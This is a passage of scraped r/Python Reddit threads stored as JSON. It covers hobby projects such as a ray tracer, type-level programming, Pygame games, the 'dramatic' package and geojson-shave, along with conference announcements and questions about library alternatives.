                    "content": "Go Team!",
                    "replies": [
                        {
                            "author": "byteme8bit",
                            "score": "7",
                            "content": "Go Team!"
                        }
                    ]
                },
                {
                    "author": "prettyanonymousXD",
                    "score": "8",
                    "content": "It’s cool that he used python, but why? I mean it’s a great and fun project, but I’d imagine that it must be painfully slow. Regardless, nice job OP!",
                    "replies": [
                        {
                            "author": "blackRNA",
                            "score": "3",
                            "content": "Maybe if he moves it to the gpu (depending on his implementation) it might be able to run at usable speeds"
                        },
                        {
                            "author": "realXavie",
                            "score": "1",
                            "content": "Am in 100% agreement with you...."
                        }
                    ]
                },
                {
                    "author": "__xor__",
                    "score": "-2",
                    "content": "C'mon, people have been doing ray tracing forever. So played out.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "2",
                            "content": "sure, but consumer hardware has only recently started to be able to do realtime ray tracing at a decent resolution. So it's a good time for people to get more familiar with it surely? I especially like path tracing, gives a nice grainy feel like a camera running with a high ISO setting (which technically it kind of is) https://www.youtube.com/watch?v=BRCAfdBMe2Y"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Synaptic_Verse",
            "score": "162",
            "content": "I thought pokeballs when I first seen it"
        },
        {
            "author": "RisingRhymer",
            "score": "49",
            "content": "Will you release the source code, I keep getting stuck building a render engine and learning how this works may help."
        },
        {
            "author": "Hardvig",
            "score": "32",
            "content": "Isn't something wrong with the shadows..? It looks like the reflection of the light source places the light source behind the camera, but the shadows seem to indicate that the light source is above the point of view..? Nevertheless, amazing job!"
        },
        {
            "author": "sysintegra",
            "score": "39",
            "content": "Cool but you shouldn't use it for pool Billard. Build Battlefield or something!"
        },
        {
            "author": "razin99",
            "score": "11",
            "content": "Nice balls OP"
        },
        {
            "author": "cloudlifter",
            "score": "7",
            "content": "Are those Pokeballs ?"
        },
        {
            "author": "HankDeTank05",
            "score": "5",
            "content": "I made a raycasting engine with python, using the Arcade library primarily. I’d be curious to know how you made this. I can show you my code, if you’d like"
        },
        {
            "author": "hamoliciousRUS",
            "score": "9",
            "content": "I am actually quite jealous... been trying to make mine work for about 2 weeks now, keep coming back to it to then get pissed off and abandon it lol... looks amazing!, going to go give mine another shot :/"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "Is it pure Python, or did you use some C too?"
        }
    ]
},
{
    "post_author": "Kiuhnm",
    "post_id": "1bozhqs",
    "post_score": "28",
    "post_time": "Wednesday, March 27, 2024 at 2:24:18 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Type-Level Programming: a POC",
    "media": [
        "https://github.com/mtomassoli/Type-Level-Programming-in-Python"
    ],
    "post_content": "While Python doesn't explicitly support Type-Level Programming, I've had some success with it.\nI think this may be of interest to the Python community, so I'm sharing a POC (Proof Of Concept) I've written.\nThis POC is a statically typed list that encodes its length in its type so that, for instance, when you concatenate two lists, the result has the correct length, all done at type-checking time.\nRead more on GitHub",
    "comments": [
        {
            "author": "LightShadow",
            "score": "8",
            "content": "You've probably already seen it, but this exists to an extent in the array.array class; though it only works for numeric types. We used this with the struct module to pack bytes for a custom wire protocol.",
            "replies": [
                {
                    "author": "Kiuhnm",
                    "score": "1",
                    "content": "No, I haven't seen it. What do you mean exactly? Do you have an example?",
                    "replies": [
                        {
                            "author": "LightShadow",
                            "score": "1",
                            "content": "I literally just banged this out, but something like this should get your gears turning... from collections import UserList from typing import TypeVar, Tuple, Type, Iterable T = TypeVar('T') class SizedList(UserList[T]): def __init__(self, _type: Type[T], iterable: Iterable[T]): super().__init__(self._validate(_type, item) for item in iterable) self.__type = _type def _validate(self, _type: Type[T], val: T) -> bool: assert isinstance(val, _type) def __class_getitem__(cls, _type: Tuple[T, int]): generic, size = _type assert size > 0 return f\"{cls.__name__}[{generic.__name__}, size={size}]\" x: SizedList[int, 10] = SizedList(int, [1,2,3,4]) print(x) But then you're kinda getting into custom data types territory where it would make more sense to have some kind of attrs or pydantic class with a \"validator\" that enforced the length that you want. Maybe the __class_getitem__ would be enough. idk. I'm not sure where mypy will give up either. Good luck!",
                            "replies": [
                                {
                                    "author": "Kiuhnm",
                                    "score": "3",
                                    "content": "First of all, sorry, in my previous post I should've written \"I hadn't seen it\", since I did have a look at it after your post, but I couldn't find what I was looking for. I don't understand your example. All I see are runtime checks such as isinstance(val, _type). Just to clarify in case we're not on the same page, the point of my POC is that I can do additions, subtractions, etc... at type-checking time, before running the code. I can basically execute ASM-like instructions at type-checking time. In a more powerful type system, one would write: def concat(list1: MyList[int, LEN1], list2: MyList[int, LEN2]) -> MyList[int, LEN1 + LEN2]: ... The hard part is that LEN1 + LEN2, which is not possible without a hell of a workaround, which is precisely what my POC offers."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "erez27",
            "score": "6",
            "content": "Mfw I have a list with 10000 items :(",
            "replies": [
                {
                    "author": "Kiuhnm",
                    "score": "6",
                    "content": "You're clearly joking, but let me offer a serious reply. You can add a few more digits and it'll still work, but it's clear Pyright was not optimized for this kind of stuff. When Template MetaProgramming (TMP) was first invented/discovered in C++, no compiler could deal with that and only small examples were possible. Things improved very quickly, though, and TMP became a standard technique. The same may happen with Python, if there's enough interest. The interesting thing is that this kind of Type-Level Programming is possible without introducing any new features in the static type system. One just needs to improve the static type checkers."
                }
            ]
        },
        {
            "author": "eztab",
            "score": "2",
            "content": "Could be interesting to have statically checkable object properties. Looks very inelegant code wise at the moment.",
            "replies": [
                {
                    "author": "marr75",
                    "score": "3",
                    "content": "Looks very inelegant code wise at the moment. Potentially correlated with the commit message of: Add files via upload"
                }
            ]
        },
        {
            "author": "ReflectedImage",
            "score": "-6",
            "content": "",
            "replies": [
                {
                    "author": "Rawing7",
                    "score": "1",
                    "content": "This is such a stupid reaction. I don't know why you chose to shove python into the \"scripting language\" box in your brain or what \"scripting language\" even means to you, but you should probably re-evaluate the pros and cons of modern python. It's true that python has some issues stemming from being duck-typed for most of its life, but it's also true that python has one of the most expressive type systems that currently exist. Languages evolve, you know? Just because python didn't have static typing when it was created, that doesn't mean it's a bad language for static typing. And the worst part about this is that you're not just some random guy, no, you're supposed to be a programmer. Evaluating pros and cons and choosing the best tool/abstraction for the specific circumstances is like 70% of our job. A programmer, of all people, should know that there are no absolutes like \"type based programming is inappropriate in scripting languages\". (Heck, even global variables have their uses sometimes.) But you sound like you made the judgment \"humph, python is just a scripting language\" 15 years ago and have refused to reconsider that ever since."
                },
                {
                    "author": "TheRNGuy",
                    "score": "1",
                    "content": "Type hints can be used. Also, most of Houdini Python API is strong typed. Only sometimes implicit conversion is allowed, between ints and floats."
                }
            ]
        }
    ]
},
{
    "post_author": "DaFluffyPotato",
    "post_id": "auh5ig",
    "post_score": "1682",
    "post_time": "Monday, February 25, 2019 at 7:53:31 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I just finished a 48 hour game jam using Python and Pygame! (Source in comments.)",
    "media": [
        "https://preview.redd.it/g81vu7azani21.gif?width=640&crop=smart&format=png8&s=237bf22a0afb674b0be7b5955bf1a875a168ff09"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Bizzle_worldwide",
            "score": "66",
            "content": "How recently did you play Hyper Light Drifter?",
            "replies": [
                {
                    "author": "DaFluffyPotato",
                    "score": "41",
                    "content": "Around 5 or 6 months ago. Why? xD",
                    "replies": [
                        {
                            "author": "Bizzle_worldwide",
                            "score": "32",
                            "content": "Oh, no reason. :D Your game looks awesome. I can’t imagine putting it together in 48 hours."
                        }
                    ]
                }
            ]
        },
        {
            "author": "DaFluffyPotato",
            "score": "77",
            "content": "The source (or Windows version) is available here: https://cmlsc.itch.io/spellcasters-forest The game was made in 48 hours for the Alakajam for the Solo Division competition. EDIT: I just uploaded the development timelapse!"
        },
        {
            "author": "plurwolf7",
            "score": "34",
            "content": "Sick animations."
        },
        {
            "author": "Zer0Voidx",
            "score": "26",
            "content": "The only thing I hate about game programming is the art so I refuse to touch it."
        },
        {
            "author": "timbledum",
            "score": "48",
            "content": "Why are you so awesome."
        },
        {
            "author": "Attendis",
            "score": "8",
            "content": "Looks like it was inspired by Wizard of Legend. Good job."
        },
        {
            "author": "domesticatedprimate",
            "score": "4",
            "content": "I messed around a bit with Pygame maybe 5 or 6 years ago, and it seemed like it hadn't really been updated for a while. Has it changed recently? I've seen it popping up here more often in the past few months."
        },
        {
            "author": "movingtreeinc",
            "score": "3",
            "content": "Oh sick! Fantastic job man!"
        }
    ]
},
{
    "post_author": "patrick91it",
    "post_id": "1bkw5ld",
    "post_score": "15",
    "post_time": "Friday, March 22, 2024 at 1:36:07 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Who's coming to PyCon Italia this year?",
    "media": [
        "https://2024.pycon.it/en"
    ],
    "post_content": "Hey folks!\nIs anyone of you attending this year PyCon Italia?\nI'm one of the organisers and I'd love to connect to new people this year 😊\nSee you there! 🐍✨",
    "comments": [
        {
            "author": "AlSweigart",
            "score": "5",
            "content": "I'm not going this year, but I went last year and it was an excellent conference (and a great excuse to visit Italy.)"
        },
        {
            "author": "Xerionik",
            "score": "3",
            "content": "Hi there! I am going to be attending (from London) - completely new to Python and PyCon Italia! 😊But really excited to be attending. I work in the analytics field and have mostly used R and SQL. Looking forward to learning more about Python and how our team might use it in the future",
            "replies": [
                {
                    "author": "patrick91it",
                    "score": "3",
                    "content": "nice! we should meet, me and some other organiser are actually based in London ☺️"
                }
            ]
        },
        {
            "author": "banana33noneleta",
            "score": "0",
            "content": "Io no :D È già tanto se riesco ad andare 2 giorni a una conferenza in città.",
            "replies": [
                {
                    "author": "patrick91it",
                    "score": "1",
                    "content": "come mai?",
                    "replies": [
                        {
                            "author": "banana33noneleta",
                            "score": "1",
                            "content": "Perché non mi pagano per farlo, e quindi figurati se mi prendo le ferie e ci metto i soldi di tasca…",
                            "replies": [
                                {
                                    "author": "patrick91it",
                                    "score": "2",
                                    "content": "peccato! è un'azienda che usa Python? magari possiamo vedere (anche in futuro) se li convinciamo a sponsorizzare ^"
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "treyhunner",
    "post_id": "1btb20j",
    "post_score": "222",
    "post_time": "Monday, April 1, 2024 at 9:12:44 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Python isn't dramatic enough",
    "media": [
        "https://pypi.org/project/dramatic/",
        "https://github.com/treyhunner/dramatic"
    ],
    "post_content": "Ever wished your Python interpreter had the dramatic feeling of a 300 baud modem connection?\nToday there's a solution: pip install dramatic\ndramatic on PyPI\ndramatic on GitHub\nWhat My Project Does\nAll text output by Python will print character-by-character.\nIt works as a context manager, as a decorator, or as a simple function call.\nOther features include a dramatic REPL, ability to run specific Python modules/scripts dramatically, and a --max-drama argument to make all Python programs dramatic all the time.\nTarget Audience\nThose seeking amusement.\nComparison\nJust like Python usually runs, but with the feeling that you're inside a text-based adventure game.",
    "comments": [
        {
            "author": "determineduncertain",
            "score": "104",
            "content": "This is so unnecessary…and I love it. I do love me a good project that’s really just about having fun.",
            "replies": [
                {
                    "author": "treyhunner",
                    "score": "6",
                    "content": "Having fun was the primary purpose of this pursuit. 😁 I'm glad this brought you some joy as well!"
                }
            ]
        },
        {
            "author": "chunkyasparagus",
            "score": "51",
            "content": "Hahahahaha this is great. import dramatic with dramatic.output: import this",
            "replies": [
                {
                    "author": "chunkyasparagus",
                    "score": "10",
                    "content": "Hey, u/treyhunner, I was running this on my windows PC, and got the following error: File <filename here>, line 79, in write sleep(1 / self.speed - (perf_counter() - before)) ValueError: sleep length must be non-negative",
                    "replies": [
                        {
                            "author": "x-cold-x",
                            "score": "51",
                            "content": "Now that's dramatic"
                        },
                        {
                            "author": "treyhunner",
                            "score": "11",
                            "content": "Thanks for noting this bug! I've opened an issue and will consider a workaround soon."
                        },
                        {
                            "author": "Cybasura",
                            "score": "2",
                            "content": "I can hear the soap opera/drama sound effects flying around"
                        }
                    ]
                }
            ]
        },
        {
            "author": "pyhannes",
            "score": "29",
            "content": "Haha nice, but that's actually quite useful when recording GIFs of code examples to slow it down a bit I could imagine. Will remember it :)",
            "replies": [
                {
                    "author": "treyhunner",
                    "score": "3",
                    "content": "It could be! u/AlSweigart had the idea that the sleep time could vary based on which character is being printed to make it look slightly more like actual typing. Pull requests welcome for that feature!"
                },
                {
                    "author": "determineduncertain",
                    "score": "4",
                    "content": "I thought about it but I will admit that I haven’t thought about how to do this beyond just opening the script and printing out the contents dramatically. That said, I haven’t spent much time in the docs nor am I a Python expert so there may be a much nicer way of doing this"
                }
            ]
        },
        {
            "author": "rejectedlesbian",
            "score": "2",
            "content": "The trolley potential of setting it system wide as part of a build process.... You can even do it randomly so people won't know why it's like that"
        },
        {
            "author": "Cybasura",
            "score": "2",
            "content": "What do you use to record your demo gifs to use in your documentations btw?"
        },
        {
            "author": "Irish_beast",
            "score": "2",
            "content": "Could we have an option to increase baud to 1200? I'm too young to remember 300 How about 9600. That would be super dramatic"
        },
        {
            "author": "ysengr",
            "score": "2",
            "content": "I absolutely love this omfg yes 😂"
        },
        {
            "author": "alcalde",
            "score": "2",
            "content": "Numba, PyPy, Cython, Taichi, Mojo, LPython, Codon all trying to make Python faster, and this project comes along to make it slower. I love it!"
        },
        {
            "author": "rk_11",
            "score": "1",
            "content": "Ahh the good CKA exam experience, r/kubernetes will be happy"
        },
        {
            "author": "drunkenitninja",
            "score": "1",
            "content": "I love it!"
        },
        {
            "author": "spenpal_dev",
            "score": "1",
            "content": "You get a star! ⭐️"
        },
        {
            "author": "forgotten_pattern",
            "score": "1",
            "content": "love it!"
        },
        {
            "author": "Glass_Dingo_3984",
            "score": "-11",
            "content": "Lol ur program very slow lol"
        }
    ]
},
{
    "post_author": "pbeens",
    "post_id": "1bp3t4j",
    "post_score": "5",
    "post_time": "Wednesday, March 27, 2024 at 5:52:43 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Open Jupyter Notebooks in Kaggle? (from GitHub)",
    "media": [
        "https://githubtocolab.com/",
        "https://github.com/"
    ],
    "post_content": "I have a repo in GitHub with Jupyter Notebooks for students. On each notebook I have a link where the student can open the notebook in Colab (by changing the URL from https://github.com/ to https://githubtocolab.com/). The problem is that some school boards have Colab blocked.\nIs there a similar technique I can use to open the notebooks in Kaggle?\nAre there other sites I should be considering?\nThanks!",
    "comments": [
        {
            "author": "Ergosphere",
            "score": "5",
            "content": "Have you asked the admins as to why they've blocked Colab?",
            "replies": [
                {
                    "author": "pbeens",
                    "score": "3",
                    "content": "Yes. Most school boards have a very comprehensive review process for things like this. I think it's also a bit of \"fear of the unknown\" so they won't approve it."
                }
            ]
        },
        {
            "author": "christoff12",
            "score": "1",
            "content": "Have you tried this? https://mybinder.org/",
            "replies": [
                {
                    "author": "pbeens",
                    "score": "1",
                    "content": "Good suggestion, but I've had a lot of problems with it, like hanging when opening repos, and just now, being VERY SLOW and not opening plots. I need something fast and reliable in the classroom. Thanks for replying."
                }
            ]
        }
    ]
},
{
    "post_author": "nobilis_rex_",
    "post_id": "1bo9z5f",
    "post_score": "0",
    "post_time": "Tuesday, March 26, 2024 at 5:59:06 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "We're building a Large Action Model (LAM) project that can do any task for you using Python!",
    "media": [],
    "post_content": "Hey guys! My friend and I are building Nelima. It's basically a Large Language Model designed to take actions on your behalf with natural language prompts and theoretically automate anything. For example, it can schedule appointments, send emails, check the weather, and even connect to IoT devices to let you command it – you can ask it to publish a website or call an Uber for you!\nYou can integrate your own custom actions, written in Python, to suit your specific needs, and layer multiple actions to perform more complex tasks. When you create these actions or functions, it contributes to the overall capabilities of Nelima, and everyone can now invoke the same action. Right now, it's a quite limited in terms of the # of actions it can do but we're having fun building a few :)\nNelima can see the outcomes of each micro-action undertaken to achieve the overarching goal. The potential for reasoning is very much possible and doesn't shy away from taking measures – for example, if it sees your grocery list from a sub-action on fulfilling an action and realizes that a certain item has allergens which might be harmful to the user, it puts a warning label, even though the user didn't ask for this.\nI thought the community here might find it useful. It uses Python 3 (Version 3.11), and the environment includes the following packages: BeautifulSoup, urllib3, requests, pyyaml. We’ll try to include more if people need those.\nGive it a try and let me know what you think! :)",
    "comments": [
        {
            "author": "soposih_jaevel",
            "score": "10",
            "content": "It would be imho similar to some gpts in the PGT store. One of my main concerns with any kind of LLM, LMM, or in your case \"LAM\" is the privacy part. Heck! I don't even use copilot in my companies' code... How are you tackling it, and why would I trust you?",
            "replies": [
                {
                    "author": "nobilis_rex_",
                    "score": "3",
                    "content": "Security is a big point, I’ll also chip in quickly the function part of things. Similar to an open-source project, functions written by the community are open to review by other members to identify potential exploitation of end-users' data or other assets. Regarding overall file privacy, we do not access users' files, much like you wouldn't expect AWS to access your private file storage bucket. Compared to general LLM services, we have no intentions of training models with your inputs. tl;dr everything is siloed to your account and specific integrations"
                }
            ]
        },
        {
            "author": "ReachingForVega",
            "score": "4",
            "content": "The problem with projects like this is you are not the primary data holder so tomorrow ChatGPT could be broken and the whole tool stops working. Example is how GPT4 is kinda labotomised.",
            "replies": [
                {
                    "author": "nobilis_rex_",
                    "score": "1",
                    "content": "I get your point. Luckily it hasn’t really affected performance like that when it comes to reasoning for tasks but that’s why we’re also thinking of putting other LLMs in the mix so that people can pick and choose",
                    "replies": [
                        {
                            "author": "ReachingForVega",
                            "score": "2",
                            "content": "Presumably you are collecting all input output to build your own specialised LLM data."
                        }
                    ]
                },
                {
                    "author": "ZeroSkribe",
                    "score": "0",
                    "content": "So I worked through this recently, in the chatGPT api you can specify which model of gpt4 you want to use, so it being changed out of under you is unlikely. Your app won't just switch to the new version."
                }
            ]
        },
        {
            "author": "nobilis_rex_",
            "score": "2",
            "content": "Oups forgot to add the link to the project: sellagen.com/nelima"
        },
        {
            "author": "Outrageous_Pizza_988",
            "score": "2",
            "content": "Have you looked at Semantic Kernel from Microsoft?"
        },
        {
            "author": "DefinitelyNotEmu",
            "score": "4",
            "content": "I already do this using Claude 3 Sonnet - how is Nelima better?",
            "replies": [
                {
                    "author": "nobilis_rex_",
                    "score": "5",
                    "content": "What do you do using Claude? Claude is a general LLM. As far as I know, function calling isn’t a big thing with Claude but either way, we are quite different in that 1) you can create your own function/action/agent to do tasks across the internet, apps and external devices 2) its community-driven meaning that the breadth of task it could potentially do is very wide. For example, I’m currently building a function for data preprocessing and then to deploy instance on AWS. We’re also allowing Nelima to send emails on your behalf using Gmail. Once I build that, then anyone can use it as well. 3) We’re building integrations with multiple apps and services so that you could, as the post state, call an Uber for example just by chatting with Nelima. We have some pretty other cool things coming down the pipeline very soon!"
                }
            ]
        },
        {
            "author": "christoff12",
            "score": "2",
            "content": "My first impression: “this is kind of a natural language Zapier, neat.”",
            "replies": [
                {
                    "author": "nobilis_rex_",
                    "score": "3",
                    "content": "Yes! It’s actually a little bit similar to Zapier but instead of connecting apps with predefined triggers and actions or focusing on marketing tools, we’re trying to add an additional layer and add multiple “blocks” and interact with different software through an LLM for a larger use-case. We’re also working on having the LAM generate user interfaces in the context of ongoing conversations. Pretty useful for example if you want it to manipulate an excel file for example"
                }
            ]
        },
        {
            "author": "vicethal",
            "score": "1",
            "content": "TOC and privacy policy actually seem pretty reasonable. But I'd like to know more about what training or fine tuning has been done (or is it just prompts on top of ChatGPT?) and what happens with integration functions written from the web interface without even logging in"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ble8ox",
    "post_score": "0",
    "post_time": "Saturday, March 23, 2024 at 3:00:16 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "FakespotAnalysisBot",
            "score": "1",
            "content": "This is a Fakespot Reviews Analysis bot. Fakespot detects fake reviews, fake products and unreliable sellers using AI. Here is the analysis for the Amazon product reviews: Name: Fluent Python Company: Luciano Ramalho Amazon Product Rating: 4.7 Fakespot Reviews Grade: B Adjusted Fakespot Rating: 4.7 Analysis Performed at: 11-18-2023 Link to Fakespot Analysis | Check out the Fakespot Chrome Extension! Fakespot analyzes the reviews authenticity and not the product quality using AI. We look for real reviews that mention product issues such as counterfeits, defects, and bad return policies that fake reviews try to hide from consumers. We give an A-F letter for trustworthiness of reviews. A = very trustworthy reviews, F = highly untrustworthy reviews. We also provide seller ratings to warn you if the seller can be trusted or not."
        }
    ]
},
{
    "post_author": "Mercrist_089",
    "post_id": "hyxwlh",
    "post_score": "1625",
    "post_time": "Monday, July 27, 2020 at 9:30:53 PM GMT+3",
    "flair_text": "Beginner Project",
    "post_title": "I made a Backtracking Algorithm Visualizer in Python with Pygame as my very first personal project!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "fe_w",
            "score": "85",
            "content": "Very nice, i also wanted to do that for a long time! How long have you been working on it?",
            "replies": [
                {
                    "author": "Mercrist_089",
                    "score": "79",
                    "content": "Over a month! But I work realllyyy slowly, I kinda had to relearn classes too at the same time since I hadn't touched Python in over 3 years, so I did both simultaneously to refresh. The tile highlighting and algorithm took me longer than I'd like to admit😂. Honestly, this project is doable in less than two weeks or so depending on your level of expertise. Don't get discouraged! Try it!! If you need help just DM me.",
                    "replies": [
                        {
                            "author": "Th3Legend277",
                            "score": "14",
                            "content": "The project is pretty doable if you just copy it from this video series"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Mercrist_089",
            "score": "67",
            "content": "Here's the repository! It's my very first project ever so feedback would be encouraged!"
        },
        {
            "author": "im_a_brat",
            "score": "15",
            "content": "Tech with tim huh...! At least give the guy a little credit."
        },
        {
            "author": "Th3Legend277",
            "score": "36",
            "content": "Cool project but at least mention that you copied the whole implementation, gui as well as the algorithm, from this video series"
        },
        {
            "author": "vexobrt",
            "score": "10",
            "content": "This looks very cool I must admit. Congratulations on your first project, keep it up! :) P.S. Where would you rank your knowledge of Python?"
        },
        {
            "author": "THE_BLUE_CHALK",
            "score": "6",
            "content": "Congrats, I also did from tech with Tim's tutorials but that was my 10th project. Congrats on this! If this your first personal project, can't wait to see what else is there in store"
        },
        {
            "author": "ExtremeTitan345",
            "score": "2",
            "content": "Well done! I've actually really wanted to make one of these after I saw tech with tim's algorithm"
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "What you can beautifully notice that on the eth tile (3rd) the breaking point occurs. On average, it fails 9/e times (gets back/changes this number) if the board is generated completely random."
        },
        {
            "author": "BlackGod743",
            "score": "2",
            "content": "incredible I'm started programmed for python, seeing this I feel like I'm on the right track"
        },
        {
            "author": "stevanmilic",
            "score": "8",
            "content": "r/madeinpython"
        }
    ]
},
{
    "post_author": "Ok-Frosting7364",
    "post_id": "1btnm5b",
    "post_score": "28",
    "post_time": "Tuesday, April 2, 2024 at 5:36:32 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "geojson-shave: a command-line tool for reducing the file size of GeoJSON files",
    "media": [
        "https://github.com/ben-n93/geojson-shave",
        "https://open-innovations.github.io/geojson-minify/"
    ],
    "post_content": "Source code: https://github.com/ben-n93/geojson-shave\nWhat my Project Does\nReduces the file size of GeoJSON files by truncating coordinates to the specified decimal place, eliminating whitespace and (optionally) replacing the property key with an empty dictionary.\nTarget Audience\nFor anyone that works with geospatial data (and specifically GeoJSON files) - so data analysts, data engineers, data journalists, GIS professionals, etc.\nComparison\nThere is a website that reduces the size of GeoJSON files, however it didn't work for me when I tested it. The advantage of my tool is that you can run it from the command-line and don't need an Internet connection.",
    "comments": [
        {
            "author": "ParticularCod6",
            "score": "3",
            "content": "Would you consider adding this to geopandas (not as an external dependency)",
            "replies": [
                {
                    "author": "Ok-Frosting7364",
                    "score": "2",
                    "content": "Oh as in integrating with the geopands library? Yeah, I'd be open to that for sure, I'll look into it! Thanks."
                },
                {
                    "author": "godofsexandGIS",
                    "score": "1",
                    "content": "2 of the 3 features are already built into geopandas. You can truncate coordinates by adding coordinate_precision=5 when using to_file(), and you can nullify your properties node by doing something like gdf = gdf[['geometry']] before using to_file(). geopandas ultimately uses GDAL for exporting, so improvements would have to be contributed to GDAL, not geopandas. It definitely could use a minify flag in the GeoJSON driver.",
                    "replies": [
                        {
                            "author": "Ok-Frosting7364",
                            "score": "1",
                            "content": "Really good to know - thanks! Can you link me the documentation for this because I can't find anything about the coordinate_precision parameter",
                            "replies": [
                                {
                                    "author": "godofsexandGIS",
                                    "score": "2",
                                    "content": "It's in the GDAL documentation: https://gdal.org/drivers/vector/geojson.html#layer-creation-options to_file() passes through parameters it doesn't recognize to GDAL. They aren't case sensitive when used this way."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "0",
            "content": "this is cool — but why not compress it to a binary format instead?",
            "replies": [
                {
                    "author": "ParticularCod6",
                    "score": "9",
                    "content": "doesn't that defeat the point of geojson if its not in json format?"
                }
            ]
        },
        {
            "author": "WonderBearD1",
            "score": "0",
            "content": "Couldn't this all be done with jq?",
            "replies": [
                {
                    "author": "Ok-Frosting7364",
                    "score": "2",
                    "content": "Yeah I'm sure but this just makes it easier for those not familiar with jq or who might not want to put in the time to learn jq if they don't have a use case beyond reducing the size of GeoJSON files. But great comment/suggestion for those not aware or familiar with jq :)"
                }
            ]
        },
        {
            "author": "robertocarlosmedina",
            "score": "0",
            "content": "Detecting & Counting coins on images with Python using OpenCV: https://youtu.be/VrgI1nPbV88"
        }
    ]
},
{
    "post_author": "Karki2002",
    "post_id": "il3ydr",
    "post_score": "1673",
    "post_time": "Wednesday, September 2, 2020 at 12:58:43 PM GMT+3",
    "flair_text": "Editors / IDEs",
    "post_title": "Map Creator made using python",
    "media": [
        "https://www.reddit.com/r/pygame/comments/ijzfv5/new_pygame_map_creator_with_some_rain_for_fun_d/",
        "https://external-preview.redd.it/pgiUlCRdxRo-HfTX9mHUsCkNt-bxPnG0EL4ki4ZV55Y.png?width=640&crop=smart&format=pjpg&auto=webp&s=b181178cb9089b52bb3de608bcc22bb6f8b06327",
        "https://www.reddit.com/r/pygame/"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "It was just a little extra I added for fun, but I would like to add other weather effects in the future :)",
            "replies": [
                {
                    "author": "Karki2002",
                    "score": "17",
                    "content": "It was just a little extra I added for fun, but I would like to add other weather effects in the future :)"
                }
            ]
        },
        {
            "author": "Exodus111",
            "score": "19",
            "content": "Cool, you using any framework for this? Like Pygame?"
        },
        {
            "author": "Todask",
            "score": "8",
            "content": "This is nice. Is there source for us to look at?"
        },
        {
            "author": "QuantumCoder002",
            "score": "5",
            "content": "upvoted this post in r/pygame and here, its just so awesome !!!!!!!"
        },
        {
            "author": "Infreezy",
            "score": "3",
            "content": "r/madeinpython"
        },
        {
            "author": "RedEyesBigSmile",
            "score": "3",
            "content": "how did you create the scrolling window?"
        },
        {
            "author": "ZyanCarl",
            "score": "2",
            "content": "Heyy, I was planning of doing something like this but kinda super mario style and pocket tanks style. Is there a way to do random terrain generation with kinda smooth transition instead of steep terrain? It was not anything urgent but I thought I’d make pocket tanks for windows"
        },
        {
            "author": "alelombi",
            "score": "2",
            "content": "This looks actually great! I would like to try it out, so keep us informed!"
        },
        {
            "author": "DUDEiFAIL",
            "score": "2",
            "content": "Does it do auto tiling of dirt in grass or not?"
        },
        {
            "author": "Taken48",
            "score": "2",
            "content": "like worldbox"
        }
    ]
},
{
    "post_author": "jonnisaesipylsur",
    "post_id": "1bojukc",
    "post_score": "14",
    "post_time": "Wednesday, March 27, 2024 at 12:34:38 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "does anyone know about an alternative to aeneas that works on python 3.12.1?",
    "media": [],
    "post_content": "i need some python library that can automatically generate a synchronization map between a list of text fragments and an audio file containing the narration of the text. aeneas does exactly that except it doesnt work on higher than 2.7 with windows.",
    "comments": [
        {
            "author": "colonelsmoothie",
            "score": "2",
            "content": "Have you tried Turnus?"
        },
        {
            "author": "zurtex",
            "score": "1",
            "content": "Reading through their issues page it seems many people have got it working on Python 3+, but it depends on numpy.distutils which numpy has depricated for a long time and does not includes in their Python 3.12+ packages. Have you tried using Python 3.11 or below and using as old numpy as possible for that Python version? e.g. pip install numpy==1.23 pip install aeneas --no-build-isolation Do you really need Python 3.12+? Could you manage with an older but still supported Python 3?"
        },
        {
            "author": "riksi",
            "score": "-6",
            "content": "",
            "replies": [
                {
                    "author": "banana33noneleta",
                    "score": "12",
                    "content": "Lol have you seen how messy these ai-related projects are? You can't just do a 1 time contribution. You need to become an expert first, and it's probably a matter of uploading tens of dependencies in a chain to make it work."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Only do this if the project won't be used beyond your local machine. Any professional or team projects needs to care about security updates.",
            "replies": [
                {
                    "author": "CcntMnky",
                    "score": "12",
                    "content": "Only do this if the project won't be used beyond your local machine. Any professional or team projects needs to care about security updates."
                }
            ]
        }
    ]
},
{
    "post_author": "catherinedevlin",
    "post_id": "1bohs1c",
    "post_score": "6",
    "post_time": "Tuesday, March 26, 2024 at 11:13:41 PM GMT+3",
    "flair_text": "News",
    "post_title": "PyOhio CFP open through May 20",
    "media": [
        "https://www.pyohio.org/2024/speaking/cfp/"
    ],
    "post_content": "Call for Proposals open through May 20\nPyOhio is a fun, friendly, free general Python conference now in its Nth year (N is large). This year it will be Sat & Sun Jul 27-28, 2024 at The Westin Cleveland Downtown in Cleveland, OH (its first year outside Columbus)!\nHope to see you there!",
    "comments": []
},
{
    "post_author": "mnvoh",
    "post_id": "1bmqxyt",
    "post_score": "25",
    "post_time": "Sunday, March 24, 2024 at 8:59:36 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Is this project worth the time and effort: Camera to Keyboard?",
    "media": [
        "https://ieeexplore.ieee.org/document/6377072",
        "https://www.investopedia.com/terms/m/market-research.asp",
        "https://github.com/mnvoh/cameratokeyboard",
        "https://www.reddit.com/user/avaqueue/",
